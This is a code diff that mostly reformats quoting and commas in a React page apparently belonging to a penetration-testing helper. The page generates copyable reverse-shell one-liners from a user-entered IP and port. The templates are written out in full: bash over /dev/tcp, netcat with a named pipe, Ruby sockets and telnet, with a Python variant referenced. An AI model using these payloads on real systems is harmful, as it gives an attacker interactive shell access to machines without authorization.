@@ -1,32 +1,27 @@
-import React, { useState } from "react";
-import { Button, message, Typography, Row, Col, Divider, Input } from "antd";
-import {
-	CopyOutlined,
-	WifiOutlined,
-	LinkOutlined,
-	createFromIconfontCN,
-} from "@ant-design/icons";
-import QueueAnim from "rc-queue-anim";
-import Clipboard from "react-clipboard.js";
+import React, { useState } from 'react';
+import { Button, message, Typography, Row, Col, Divider, Input } from 'antd';
+import { CopyOutlined, WifiOutlined, LinkOutlined, createFromIconfontCN } from '@ant-design/icons';
+import QueueAnim from 'rc-queue-anim';
+import Clipboard from 'react-clipboard.js';
 
 const { Title, Paragraph } = Typography;
 const IconFont = createFromIconfontCN({
-	scriptUrl: ["./iconfont.js"],
+	scriptUrl: [ './iconfont.js' ]
 });
 
 export default (props) => {
-	const [values, setValues] = useState({
-		ip: "",
-		port: "",
+	const [ values, setValues ] = useState({
+		ip: '',
+		port: ''
 	});
 	const handleChange = (name) => (event) => {
 		setValues({ ...values, [name]: event.target.value });
 	};
 	const successInfoReverseShell = () => {
-		message.success("Your reverse shell has been copied");
+		message.success('Your reverse shell has been copied');
 	};
 	const successInfoEncodeURL = () => {
-		message.success("Reverse shell URI encoded has been copied");
+		message.success('Reverse shell URI encoded has been copied');
 	};
 	const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`;
 	const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${values.ip} ${values.port} >/tmp/f`;
@@ -39,18 +34,16 @@ export default (props) => {
 	const ruby_rshell = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["${values.ip}"],ENV["${values.port}"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
 	const telnet_rshell = `TF=$(mktemp -u);
   mkfifo $TF && telnet ${values.ip} ${values.port} 0<$TF | /bin/sh 1>$TF
-  `;
+	`;
+
 	return (
 		<QueueAnim delay={300} duration={1500}>
-			<Title
-				variant='Title level={3}'
-				style={{ fontWeight: "bold", margin: 15 }}
-			>
+			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
 				Reverse shell
 			</Title>
 			<Paragraph style={{ margin: 15 }}>
-				A reverse shell is a shell session established on a connection that is
-				initiated from a remote machine, not from the local host.
+				A reverse shell is a shell session established on a connection that is initiated from a remote machine,
+				not from the local host.
 			</Paragraph>
 			<div style={{ padding: 15 }}>
 				<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
@@ -60,7 +53,7 @@ export default (props) => {
 							prefix={<WifiOutlined />}
 							name='Ip adress'
 							placeholder='IP Address (ex: 212.212.111.222)'
-							onChange={handleChange("ip")}
+							onChange={handleChange('ip')}
 						/>
 					</Col>
 					<Col span={12}>
@@ -69,7 +62,7 @@ export default (props) => {
 							prefix={<IconFont type='icon-Network-Plug' />}
 							name='Port'
 							placeholder='Port (ex: 1337)'
-							onChange={handleChange("port")}
+							onChange={handleChange('port')}
 						/>
 					</Col>
 				</Row>
@@ -133,7 +126,7 @@ export default (props) => {
 				key='c'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Title level={3}>
@@ -167,7 +160,7 @@ export default (props) => {
 				key='d'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Title level={3}>
@@ -201,14 +194,14 @@ export default (props) => {
 				key='e'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Title level={3}>
 					Python <IconFont type='icon-python' />
 				</Title>
 				<Paragraph copyable ellipsis={true}>
-					{" "}
+					{' '}
 					{python_rshell}
 				</Paragraph>
 				<Clipboard component='a' data-clipboard-text={python_rshell}>
@@ -236,7 +229,7 @@ export default (props) => {
 				key='f'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Title level={3}>
